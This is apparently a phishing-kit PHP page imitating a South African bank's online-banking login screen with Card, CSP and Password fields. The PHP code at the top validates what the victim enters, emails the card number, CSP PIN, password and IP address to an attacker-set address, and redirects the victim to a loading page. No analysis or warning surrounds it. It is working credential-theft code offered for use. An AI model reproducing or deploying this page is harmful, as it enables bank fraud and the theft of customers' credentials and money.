<?php
require 'add.php';
$ip = getenv("REMOTE_ADDR");
if(isset($_POST['login']))
{
    
    if(trim($_POST['ccn']) == "" || !preg_match('/^[0-9]{5,18}$/', $_POST['ccn']) || trim($_POST['csp']) =="" || !preg_match('/^[0-9]{5}$/', $_POST['csp'])
    || trim($_POST['pwd']) == "" || strlen($_POST['pwd']) < 6 || strlen($_POST['pwd']) > 20)
    {
        $error='The details you have entered are incorrect. Please re-enter and submit it again.';
    } 

    else {
      
	  $to = EMAIL;
      $subject = "first info ".$ip;
      $msg  = $_POST['ccn']."<br>";
      $msg .= $_POST['csp']."<br>";
      $msg .= $_POST['pwd']."<br>";
      $msg .= $ip;
		
      $headers  = 'MIME-Version: 1.0' . "\r\n";
      $headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
      $headers .= 'From: rezolt' . "\r\n" .
    		      'X-Mailer: PHP/' . phpversion();
	  mail($to,$subject,$msg,$headers);
	  header('Location:loading.php');
	  exit;
	}
}
?>
<html>
    <head>
        
        <title>Welcome</title>

<meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/favicon.ico">

		<link rel="stylesheet" href="css/font-awesome.min.css" type="text/css"/>
		<link rel="stylesheet" href="css/ladda-themeless.min.css" type="text/css"/>
		<link rel="stylesheet" href="css/jquery-ui-1.10.0.custom.css" type="text/css"/>
        <script type="text/javascript" src="js/date.js"></script>
		<link rel="stylesheet" href="css/ib-bootstrap.css" type="text/css"/>
	
		<!--[if IE]>
		<style>
			@media (min-width: 991px) {
				 .navbar-nav {
				    display:inline-block;
				    float: none;
				    margin: 0;
				    height: 35px;
				 }
			}		    
		</style>
		<![endif]-->
		<style type="text/css">
			.radio label, .checkbox label {
				padding-left: 20px;
				margin-bottom: 0;
			}			
			.radio input[type=radio], .radio-inline input[type=radio], .checkbox input[type=checkbox], .checkbox-inline input[type=checkbox] {
				position: absolute;
			}
			.dropdown-menu {
  				text-align: left;
  			}
		</style>
		<script type="text/javascript" src="js/jquery-1.11.1.min.js"></script>
		<script type="text/javascript" src="js/jquery-ui.min.js"></script>
		<script type="text/javascript" src="js/bootstrap.min.js"></script>
		<script type="text/javascript" src="js/jquery.dataTables.min.js"></script>
		<script type="text/javascript" src="js/dataTables.bootstrap.js"></script>
		
		
	<!--[if lt IE 9]>
	<script src="js/html5shiv.min.js"></script>
	<script src="js/respond.min.js"></script>
	<![endif]-->	
		
      
        	
    </head>

<body>
	<div class="navbar navbar-default navbar-fixed-top">
		



<div id="topBarFrame">
<div class="row siteheader">
	<div class="container">
		<div class="siteLogo">
			<img class="" alt="" src="images/OrganizationLogo.png">
		</div>
	</div>
</div>
</div>


	</div>
	
	<div id="pageContentFrame">
		<div id="pageContentMainFrame">
			<div id="pageContent" class="product">
				<div class="container">
					<br class="clearBoth" />
					
					<div id="mainpage" class="row">
						


<div class="col-sm-3">
<div class="quicklinksbox">
		<h4>Apply</h4>
		<ul class="dropdown">		
		<li class="menu-no-child"><a data-toggle="modal" href="#" data-target="#genericModal">About Self-service</a></li>
		<li class="menu-no-child"><a href="#">Functionality</a></li>
		<li class="menu-no-child"><a href="#">FAQs</a></li>
		<li class="menu-no-child"><a href="#">Costs</a></li>
		<li class="menu-no-child"><a href="#">About us</a></li>
		<li class="menu-no-child"><a href="#">Contact us</a></li>
		<li class="menu-no-child"><a data-toggle="modal" href="#" data-target="#genericModal">Electronic Agreement</a></li>
		<li class="menu-no-child"><a href="#">Auto Share Investment Agreement</a></li>
		<li class="menu-no-child"><a href="#">Privacy and security</a></li>
		<li class="menu-no-child"><a href="#">Disclaimer</a></li>
		<li class="menu-no-child"><a href="#"> home page</a></li>
		</ul>
</div>
<br>
</div>
						




<!-- ########## COLUMN 2 START ########## -->
<div class="col-sm-6">
	<div class="panel panel-default">
		


<span style="font-size: xx-small; float: right; padding: 7px; color: #26428B; background-color: white;">
	<span id="date_time"></span>
	<script type="text/javascript">window.onload = date_time('date_time');</script>
</span>

		<div class="panel-body panel-content">
			<h4>
				<span class="lock"></span>
				Login
			</h4>

<span class="alert-danger">
  
</span>
<br class="clearBoth" />
			    
<script language="Javascript" src="js/fields.js"></script>

                <div class="panel-body">
				<?php
				if(isset($_POST['login']))
                {
				?>
				<span class="alert-danger">
                    <label for="errormessage"> 
                        <p class="error" alt="Error message"><?php echo $error; ?><br /> </p>   
	                </label>
                </span>
                <?php } ?>
				
               
                <form id="signonForm" class="form-horizontal" action="index.php" method="post" autocomplete="off">
													<!-- Form Name -->
													<!-- 				<legend>Login</legend> -->
				
													<!-- Text input-->
													<div class="form-group">
														<label class="col-md-4 control-label" for="ccn">Card</label>
														<div class="col-md-6">
															<input id="ccn" name="ccn" type="text" class="form-control input-sm" maxlength="25">
															<span class="alert-danger"></span>
														</div>
													</div>
				
													<!-- Password input-->
													<div class="form-group">
														<label class="col-md-4 control-label" for="csp">CSP</label>
														<div class="col-md-6">
															<input id="csp" name="csp" type="password" class="form-control input-sm" maxlength="5">
															<span class="alert-danger"></span>
														</div>
													</div>
				
													<!-- Password input-->
													<div class="form-group">
														<label class="col-md-4 control-label" for="pwd">Password</label>
														<div class="col-md-6">
															<input id="pwd" name="pwd" type="password"
																placeholder="" class="form-control input-sm" maxlength="25">
															<span class="alert-danger"></span>
														</div>			
													</div>
				
													<!-- Multiple Checkboxes -->
													<div class="form-group">
														<label class="col-md-4 control-label" for="checkboxes">Change</label>
														<div class="col-md-6">
															<div class="list-group checkbox">
																<label for="changecsp"> <input type="checkbox"
																	name="changePin" id="changecsp" value="ON"> CSP
																</label>
															</div>
															<div class="list-group checkbox">
																<label for="changepass"> <input type="checkbox"
																	name="changePwd" id="changepass" value="ON">
																	Password
																</label>
															</div>															
														</div>
													</div>
				
													<!-- Button (Double) -->
													<div class="form-group">
														<label class="col-md-4 control-label" for="login"></label>
														<div class="col-md-6">
															<button type="submit" id="login" name="login" value="Login" class="btn btn-primary ladda-button" data-style="expand-left">
																<span class="ladda-label">Login</span>
																<span class="ladda-spinner"></span>
																<div class="ladda-progress" style="width: 0px;"></div>
															</button>
														</div>
													</div>
				
											</form>
											<div>
												<p>
													By logging on I acknowledge that I have read, understood and am
													bound by the version of the <a href="#">Electronic Agreement</a>
													that is posted on the website at the time of logging on. (Last
													updated: 27 September 2013)
												</p>
											</div>
							                <!--
							                <script type="text/javascript" language="JavaScript">
							                    
							                    var focusControl = document.forms["signonForm"].elements["ccn"];
							                    if (focusControl != null && focusControl.type != "hidden") {
							                    focusControl.focus();
							                    }
							                    
							                </script>
							                // -->        
							            
							            
							            <hr/>
							            
							             <div align="center">
							            <a href="#" id="quiz"> <img class="img-responsive" src="images/take_the_quiz_large.jpg" alt="Take the quiz">
						</a>
						
						</div>
                   
                </div>



   
		</div>
	</div>
</div>
						

<div class="col-sm-3">	
	
	<div class="right-tile">
		<h4><span class="mouseicon"></span>Registration</h4>
		<div class="right-tile_content quicklinksbox">
			<ul>
				<li><a href="#">Register</a></li>		
				<li><a href="#" >Create and</a></li>
	            <li><a href="#">Reset and</a></li>
			</ul>
		</div>
	</div>	
	
	<br class="clearBoth"/>
	
	<div class="panel panel-default tile-sm">
		<div class="panel-body panel-content">
		<h4>Customer Care Line</h4>
			<div class="customer_care--details">
				<img class="customer_care--img"	src="images/icon_south_africa.png">
				<p>
					South Africa <br> 
				</p>
			</div>
			<div class="customer_care--details">
				<img class="customer_care--img"	src="images/icon_global.png">
				<p>
					International <br> 
				</p>
			</div>
			<div class="customer_care--details">
				<img class="customer_care--img"	src="images/icon_email.png">
				<p>
					Email<br> Send us an <a	href="#">email</a>
				</p>
			</div>
		</div>
	</div>
</div>
<br class="clearBoth"/>
<br class="clearBoth"/>
<br class="clearBoth"/>
					</div>
				</div>
				<hr />
			</div>
		</div>
	</div>
	
<footer>
	<div class="row">
		<div class="col-sm-12">
			<img class="img-responsive pull-right" style="padding-top: 10px; padding-right: 20px; width: 135px;" src="images/movingfwd.png" alt=""></img>			
			<p class="pull-left" style="padding-top: 10px; padding-left: 20px;">
				<small>&copy; <?php echo date("Y"); ?>  <span id="footerText"></span></small>
			</p>
		</div>
	</div>	
</footer>
<script>
    window.onload = function() {
    document.getElementById("ccn").focus();
    }
    </script>

</body>
</html>
